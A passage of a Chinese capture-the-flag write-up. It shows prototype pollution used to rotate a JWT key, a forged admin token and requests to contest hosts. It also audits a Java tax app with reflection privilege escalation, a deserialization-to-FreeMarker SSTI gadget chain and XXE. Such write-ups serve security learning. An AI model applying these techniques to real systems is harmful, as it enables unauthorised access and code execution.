+<td><code>depth &lt; 3</code> 为 false，<strong>放行</strong></td>
+<td>递归进入（target 是函数 <code>Object</code>）</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>prototype</code></td>
+<td>未命中</td>
+<td><code>depth &lt; 3</code> 为 false，<strong>放行</strong></td>
+<td>递归进入（target 是 <code>Object.prototype</code>）</td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>pending</code></td>
+<td>未命中</td>
+<td>未命中</td>
+<td>✅ <code>Object.prototype.pending = &quot;passwd&quot;</code></td>
+</tr>
+</tbody></table>
+<p>Step 3：触发 JWT 签名密钥轮换</p>
+<p><code>/api/system/healthcheck</code> 端点<strong>无需认证</strong>，直接调用 <code>configRefresh()</code>：</p>
+<p><img src="/mdimg/2026DASCTF/1780211997116-be676376-ba1d-4686-85a8-dcdac82354b9.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>关键原理</strong>:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> rotation = &#123;&#125;;  <span class="hljs-comment">// 新建空对象</span><br><span class="hljs-comment">// 由于 Object.prototype.pending 已被污染为 &quot;passwd&quot;</span><br><span class="hljs-comment">// rotation.pending 通过原型链继承得到 &quot;passwd&quot;</span><br><br><span class="hljs-keyword">if</span> (rotation.<span class="hljs-property">pending</span>) &#123;                    <span class="hljs-comment">// &quot;passwd&quot; 是 truthy ✅</span><br>  signingState.<span class="hljs-property">active</span> = rotation.<span class="hljs-property">pending</span>;  <span class="hljs-comment">// JWT 签名密钥被替换！</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>响应确认密钥已轮换</strong>:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;healthy&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;configVersion&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span>         <span class="hljs-comment">// 版本变更</span><br>  <span class="hljs-attr">&quot;rotated&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>            <span class="hljs-comment">// ✅ 确认轮换成功</span><br>  <span class="hljs-attr">&quot;services&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;signingKeyVersion&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;v3&quot;</span> <span class="hljs-comment">// 新版本</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="Step-4：伪造-Admin-JWT"><a href="#Step-4：伪造-Admin-JWT" class="headerlink" title="Step 4：伪造 Admin JWT"></a>Step 4：伪造 Admin JWT</h4><p><img src="/mdimg/2026DASCTF/1780212399702-f22763fb-fc9b-408f-912e-57232417ace1.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用伪造的 admin JWT 访问 <code>/admin</code> 管理面板：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImY0YjU2ODNkLTEwZTktNDk0Ni05YmE4LTQ2MWJmOTZkNzQzZCIsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODAyMTE3MjEsImV4cCI6MTc4MDI5ODEyMX0.sr6Wd26Swi_k1EtoqvyLok7ynGNVTU4HwH41Iayo3Zk<br></code></pre></td></tr></table></figure>
+
+<p>页面返回：</p>
+<p><img src="/mdimg/2026DASCTF/1780212557664-42735808-b706-4f3e-ab1a-50d7defceb51.png" srcset="/img/loading.gif" lazyload></p>
+<p>Step 5：执行诊断获取 Flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /api/reports/execute HTTP/1.1<br>Host: 686d3db8.http-ctf2.dasctf.com<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImY0YjU2ODNkLTEwZTktNDk0Ni05YmE4LTQ2MWJmOTZkNzQzZCIsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODAyMTE3MjEsImV4cCI6MTc4MDI5ODEyMX0.sr6Wd26Swi_k1EtoqvyLok7ynGNVTU4HwH41Iayo3Zk<br>Referer: http://686d3db8.http-ctf2.dasctf.com/register<br>Accept-Language: zh-CN,zh;q=0.9<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/json<br><br>&#123;<span class="hljs-string">&quot;reference&quot;</span>: <span class="hljs-string">&quot;bcd7e09286a61cb0583b87da859eda7f&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>响应</strong>:</p>
+<p><img src="/mdimg/2026DASCTF/1780212537287-1eef02c8-f95d-43e1-b513-8999428b7578.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="TaxManager"><a href="#TaxManager" class="headerlink" title="TaxManager"></a>TaxManager</h3><p>代码审计总结</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">com/tax/<br>├── controller/<br>│   ├── AuthController.java      ← 反射型权限提升<br>│   ├── ExportController.java    ← 反序列化触发点<br>│   ├── ImportController.java    ← XXE漏洞<br>│   ├── ReviewController.java    ← HMAC签名验证 + 恶意数据存储<br>│   └── ...<br>├── util/<br>│   ├── ScheduledTaskHandler.java ← 反序列化Gadget入口 (自定义readObject)<br>│   └── SerializeUtil.java       ← 不安全的ObjectInputStream<br>├── job/<br>│   └── ReportJob.java           ← Gadget链中间节点 (Runnable)<br>└── report/<br>    └── PdfReportGenerator.java  ← FreeMarker SSTI Sink<br></code></pre></td></tr></table></figure>
+
+<h4 id="漏洞1-反射型权限提升-Privilege-Escalation-via-Reflection"><a href="#漏洞1-反射型权限提升-Privilege-Escalation-via-Reflection" class="headerlink" title="漏洞1: 反射型权限提升 (Privilege Escalation via Reflection)"></a>漏洞1: 反射型权限提升 (Privilege Escalation via Reflection)</h4><p>文件: <code>AuthController.java:122-134</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">Set&lt;String&gt; readonlyFields = new HashSet&lt;&gt;(Arrays.asList(&quot;id&quot;, &quot;username&quot;, &quot;password&quot;));<br>for (Map.Entry&lt;String, String&gt; entry : body.entrySet()) &#123;<br>    String key = entry.getKey();<br>    String value = entry.getValue();<br>    // 仅阻止 role=admin，但允许 role=reviewer<br>    if (!readonlyFields.contains(key) &amp;&amp; (!&quot;role&quot;.equals(key) || !&quot;admin&quot;.equals(value))) &#123;<br>        Field field = User.class.getDeclaredField(key);<br>        field.setAccessible(true);<br>        field.set(user, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/2026DASCTF/1780236049065-7b5dd8a0-c263-4e07-b86b-82c025248dc9.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用Java反射设置User对象的任意字段。只禁止了 <code>role=admin</code>，但允许 <code>role=reviewer</code>，实现权限提升</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /api/profile/update HTTP/1.1<br>Host: 9f3b28f5.http-ctf2.dasctf.com<br>Accept-Encoding: gzip, deflate<br>Referer: http://9f3b28f5.http-ctf2.dasctf.com/register<br>Content-Type: application/json<br>Accept-Language: zh-CN,zh;q=0.9<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36<br>Origin: http://9f3b28f5.http-ctf2.dasctf.com<br>Cookie: JSESSIONID=865143277825A35AD338DCE6CA0D4ACD<br>Accept: */*<br>Content-Length: 58<br><br>&#123;<br>  &quot;role&quot;: &quot;reviewer&quot;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/2026DASCTF/1780236166622-c5833198-9145-487e-9ff8-fc8cb0cf60f2.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>/api/profile</code>验证</p>
+<p><img src="/mdimg/2026DASCTF/1780236223272-a0fb9104-6e17-44d4-aec7-3b42cb4bcd34.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="漏洞2-不安全的Java反序列化-Unsafe-Deserialization"><a href="#漏洞2-不安全的Java反序列化-Unsafe-Deserialization" class="headerlink" title="漏洞2: 不安全的Java反序列化 (Unsafe Deserialization)"></a><font style="color:rgb(51, 51, 51);">漏洞2: 不安全的Java反序列化 (Unsafe Deserialization)</font></h4><p>文件: <code>com.tax.util.SerializeUtil:20-24</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializeUtil</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String base64Data)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">byte</span>[] data = Base64.getDecoder().decode(base64Data);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data));<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;  <span class="hljs-comment">// 无类型过滤！</span><br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/2026DASCTF/1780236466343-44c7da17-f84d-4c0a-bf5f-c22db72d8b5e.png" srcset="/img/loading.gif" lazyload><br> 使用原始 <code>ObjectInputStream.readObject()</code>，无任何类型白名单或过滤。</p>
+<p>找调用</p>
+<p><img src="/mdimg/2026DASCTF/1780236578787-4aba6c5e-578a-439b-9a96-f891b8936d19.png" srcset="/img/loading.gif" lazyload></p>
+<p>com.tax.controller.ExportController</p>
+<p><img src="/mdimg/2026DASCTF/1780237353203-0b6688eb-d562-4e5d-a938-3d5ab60151cf.png" srcset="/img/loading.gif" lazyload></p>
+<p>参数是<code>voucherData</code>，由<code>/api/export/generate</code>接口传入，这个接口访问需要reviewer权限，并且需要从<code>/api/export/prepare</code>获取<code>exportToken</code></p>
+<h4 id="漏洞3-自定义反序列化Gadget链"><a href="#漏洞3-自定义反序列化Gadget链" class="headerlink" title="漏洞3: 自定义反序列化Gadget链"></a><font style="color:rgb(51, 51, 51);">漏洞3: 自定义反序列化Gadget链</font></h4><p>com.tax.util.ScheduledTaskHandler</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tax.util;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.util.LinkedList;<br><span class="hljs-keyword">import</span> java.util.Queue;<br><br><span class="hljs-comment">/* JADX INFO: loaded from: taxmanager-1.1.0-ctf.jar:BOOT-INF/classes/com/tax/util/ScheduledTaskHandler.class */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScheduledTaskHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">private</span> Queue&lt;Runnable&gt; taskQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>();<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException &#123;<br>        ois.defaultReadObject();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.taskQueue != <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-built_in">this</span>.taskQueue.isEmpty()) &#123;<br>            <span class="hljs-keyword">for</span> (Runnable task : <span class="hljs-built_in">this</span>.taskQueue) &#123;<br>                task.run(); <span class="hljs-comment">// 直接调用Runnable.run()</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>反序列化时会自动执行 <code>taskQueue</code> 里的所有 <code>Runnable</code> 对象的<code>run()</code>方法。</p>
+<p>找Runnable+Serializable的类并且有run()方法</p>
+<p>得到com.tax.job.ReportJob</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tax.job;<br><br><span class="hljs-keyword">import</span> com.tax.report.PdfReportGenerator;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">/* JADX INFO: loaded from: taxmanager-1.1.0-ctf.jar:BOOT-INF/classes/com/tax/job/ReportJob.class */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReportJob</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">private</span> PdfReportGenerator generator;<br>    <span class="hljs-keyword">private</span> String templateContent;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ReportJob</span><span class="hljs-params">(PdfReportGenerator generator, String templateContent)</span> &#123;<br>        <span class="hljs-built_in">this</span>.generator = generator;<br>        <span class="hljs-built_in">this</span>.templateContent = templateContent;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// java.lang.Runnable</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.generator != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-built_in">this</span>.templateContent != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.generator.render(<span class="hljs-built_in">this</span>.templateContent); <span class="hljs-comment">//generator和templateContent可控</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里是模板渲染，参数可控。<code>generator</code>是<code>PdfReportGenerator</code>的对象</p>
+<p>查看com.tax.report.PdfReportGenerator</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PdfReportGenerator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">private</span> String reportFormat;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">PdfReportGenerator</span><span class="hljs-params">(String reportFormat)</span> &#123;<br>        <span class="hljs-built_in">this</span>.reportFormat = reportFormat;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">render</span><span class="hljs-params">(String templateContent)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Configuration</span> <span class="hljs-variable">cfg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>(Configuration.VERSION_2_3_31);<br>            <span class="hljs-type">StringTemplateLoader</span> <span class="hljs-variable">stringLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringTemplateLoader</span>();<br>            stringLoader.putTemplate(<span class="hljs-string">&quot;reportTemplate&quot;</span>, templateContent);<br>            cfg.setTemplateLoader(stringLoader);<br>            <span class="hljs-type">Template</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> cfg.getTemplate(<span class="hljs-string">&quot;reportTemplate&quot;</span>);<br>            <span class="hljs-type">StringWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>            template.process(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), out);  <span class="hljs-comment">// 模板注入，但没有输出out，无回显</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>直接将用户控制的内容作为FreeMarker模板执行，且使用 <code>VERSION_2_3_31</code> 默认的 <code>UNSAFE_RESOLVER</code>，允许使用 <code>ObjectConstructor</code> 等危险内置函数。</p>
+<p><strong>Gadget链</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">ScheduledTaskHandler.readObject()<br>  → LinkedList&lt;Runnable&gt;.forEach(Runnable::run)<br>    → ReportJob.run()<br>      → PdfReportGenerator.render(templateContent)<br>        → FreeMarker SSTI (Server-Side Template Injection)<br></code></pre></td></tr></table></figure>
+
+<h4 id="漏洞4-XXE-XML-External-Entity-Injection"><a href="#漏洞4-XXE-XML-External-Entity-Injection" class="headerlink" title="漏洞4: XXE (XML External Entity Injection)"></a><font style="color:rgb(51, 51, 51);">漏洞4: XXE (XML External Entity Injection)</font></h4><p><strong>文件</strong>: <code>ImportController.java:21-23</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImportController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(value = &#123;&quot;/api/import/history&quot;&#125;, method = &#123;RequestMethod.POST&#125;, consumes = &#123;&quot;application/xml&quot;&#125;, produces = &#123;&quot;application/json&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">importHistory</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String xmlData)</span> &#123;<br>        Map&lt;String, Object&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>            <span class="hljs-comment">// 未禁用外部实体</span><br>            <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> dbf.newDocumentBuilder();<br>            <span class="hljs-type">Document</span> <span class="hljs-variable">doc</span> <span class="hljs-operator">=</span> builder.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(xmlData.getBytes()));<br>            <span class="hljs-type">String</span> <span class="hljs-variable">taxpayerId</span> <span class="hljs-operator">=</span> doc.getElementsByTagName(<span class="hljs-string">&quot;taxpayerId&quot;</span>).item(<span class="hljs-number">0</span>).getTextContent();<br>            result.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">true</span>);<br>            result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;History imported successfully for taxpayer: &quot;</span> + taxpayerId);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            result.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);<br>            result.put(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;Error parsing XML: &quot;</span> + e.getMessage());<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/2026DASCTF/1780241280429-a2ca29b8-5f3a-477b-a195-9a475627c7b0.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里waf不许读flag，由于freemarker的ssti没回显，所以可以ssti执行mv /flag /tmp/xxx来通过xxe读取</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>首先找source，也就是<code>voucherData</code>是怎么传入的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">String voucherData = req.getVoucherData();<br></code></pre></td></tr></table></figure>
+
+<p>找<code>setVoucherData()</code></p>
+<p>在com.tax.service.RefundService</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs plain">public class RefundService &#123;<br><br>    @Autowired<br>    private RefundRepository refundRepository;<br><br>    public RefundRequest createRefund(Long userId, String taxpayerId, double amount, String reason, int taxYear) &#123;<br>        RefundRequest req = new RefundRequest();<br>        req.setUserId(userId);<br>        req.setTaxpayerId(taxpayerId);<br>        req.setAmount(amount);<br>        req.setReason(reason);<br>        req.setTaxYear(taxYear);<br>        req.setStatus(&quot;pending&quot;);<br>        return (RefundRequest) this.refundRepository.save(req);<br>    &#125;<br><br>    public List&lt;RefundRequest&gt; getRefundsByUser(Long userId) &#123;<br>        return this.refundRepository.findByUserId(userId);<br>    &#125;<br><br>    public RefundRequest getRefundById(Long id) &#123;<br>        return this.refundRepository.findById(id).orElse(null);<br>    &#125;<br><br>    public RefundRequest approveRefund(Long refundId, String attachmentData) &#123;<br>        RefundRequest req = this.refundRepository.findById(refundId).orElse(null);<br>        if (req == null || !&quot;pending&quot;.equals(req.getStatus())) &#123;<br>            return null;<br>        &#125;<br>        req.setStatus(&quot;approved&quot;);<br>        if (attachmentData != null &amp;&amp; !attachmentData.isEmpty()) &#123;<br>            req.setVoucherData(attachmentData);  //在这<br>        &#125; else &#123;<br>            try &#123;<br>                TaxReport report = new TaxReport(UUID.randomUUID().toString(), req.getTaxpayerId(), req.getAmount(), req.getTaxYear());<br>                req.setVoucherData(SerializeUtil.serialize(report));<br>            &#125; catch (IOException e) &#123;<br>                req.setVoucherData(&quot;&quot;);<br>            &#125;<br>        &#125;<br>        return (RefundRequest) this.refundRepository.save(req);<br>    &#125;<br><br>    public RefundRequest saveRefund(RefundRequest req) &#123;<br>        return (RefundRequest) this.refundRepository.save(req);<br>    &#125;<br><br>    public RefundRequest rejectRefund(Long refundId) &#123;<br>        RefundRequest req = this.refundRepository.findById(refundId).orElse(null);<br>        if (req == null || !&quot;pending&quot;.equals(req.getStatus())) &#123;<br>            return null;<br>        &#125;<br>        req.setStatus(&quot;rejected&quot;);<br>        return (RefundRequest) 